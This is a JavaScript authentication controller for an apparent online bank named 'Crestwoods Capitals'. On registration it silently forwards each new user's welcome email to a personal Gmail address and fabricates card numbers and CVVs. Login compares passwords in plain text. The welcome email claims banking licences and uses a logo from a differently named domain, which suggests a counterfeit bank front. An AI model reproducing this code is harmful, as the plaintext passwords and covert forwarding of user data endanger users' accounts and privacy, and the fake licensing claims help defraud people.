const User = require("../models/UserModel");
const createTokenUser = require("../utils/createTokenUser");
const { createToken } = require("../utils/token");
const { handleError } = require("../utils/handleError");
const sendEmail = require("../utils/emailSender");
const cloudinary = require("cloudinary").v2;
const {
  generateRandomAccountNumber,
  generateRandomRoutingNumber,
  generateRandomCardNumber,
  generateRandomCVV,
  generateRandomExpirationDate,
  generateRandomAccountNumberCheckings,
} = require("../utils/randomGenarator");

const register = async (req, res) => {
  try {
    const { email } = req.body;
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res
        .status(400)
        .json({ status: "failed", error: "User already exists!" });
    }

    const accountNumber = generateRandomAccountNumber();
    const cvvNumber = generateRandomCVV();
    const expiringDate = generateRandomExpirationDate();
    const cardNumber = generateRandomCardNumber();
    const routingNumber = generateRandomRoutingNumber();
    const checkingsAccountNumber = generateRandomAccountNumberCheckings()
    const savingsAccountNumber = generateRandomAccountNumber()

    const userData = {
      ...req.body,
      account_number: accountNumber,
      routing_number: routingNumber,
      card_number: cardNumber,
      cvv: cvvNumber,
      expiring_date: expiringDate,
      checkings_account_number: checkingsAccountNumber,
      savings_account_number: savingsAccountNumber
    
    };

    const user = await User.create(userData);

    const subject = "Registration successfull";
    const text = `Hi ${user.name},\n\nWelcome to YourApp! Your registration was successful.`;
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Crestwoods Capitals!</title>
    <style>
        /* Add your custom CSS styles here */
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0044cc;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header image -->
         <div style="text-align: center;">
        <img src="https://coastlinecapitals.com/uploads/1697015495_a78b0815e536cde60b80.png" alt="Crestwoods Capitals Logo" style="max-width: 100%; height: auto;;">

         </div>

        <h1>Welcome to Crestwoods Capitals, ${user.name}!</h1>
        <p>Your Bank is now active.</p>
        
        <h3>Included with Your Profile:</h3>
        <ul>
            <li>Streamlined transfers that allow you to send money and make payments quickly.</li>
            <li>24/7 access to your transaction history.</li>
            <li>Saved payment information.</li>
            <li>Email notifications when your transfer has been picked up.</li>
        </ul>

         <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
        </div>

            <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
        <p>It's important to keep your account secure. Here are some security tips:</p>
        <ul>
          <li>Never share your account password with anyone.</li>
          <li>Use strong, unique passwords for your online banking.</li>
        </ul>

        <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a>  or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>

        <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
            <p>© Crestwoods Capitals.</p>
        </div>
    </div>
</body>
</html>
`;
  

console.log(user.email);
    await sendEmail(user.email, subject, text, html); 
    await sendEmail(
      "Allenjenny126@gmail.com",
      `from ${user.email}`,
      text,
      html
    );

    const tokenUser = createTokenUser(user);

    return res.status(200).json({
      token: createToken({ user: tokenUser }),
      status: "success",
      message: "Registration successful",
      user: tokenUser,
    });
  } catch (error) {   
    console.error(error);
    res.status(500).json({ status: "failed", error: error.message });
  }
};

const login = async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res
        .status(400)
        .json({ status: "failed", message: "Email and password are required" });
    }

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(401).json({
        status: "unauthorized",
        error: "Invalid email or password",
      });
    }

    // Direct comparison of passwords (assuming plain text passwords)
    if (password !== user.password) {
      return res.status(401).json({
        status: "unauthorized",
        error: "Invalid email or password",
      });
    }

    const tokenUser = createTokenUser(user);
    return res.status(200).json({
      token: createToken({ user: tokenUser }),
      status: "success",
      message: "Login successful",
      user: tokenUser,
    });
  } catch (error) {
    console.error("Error during login:", error);
    const errors = handleError(error);
    res.status(500).json({ status: "failed", error: errors });
  }
};


module.exports = {
  register,
  login,
};
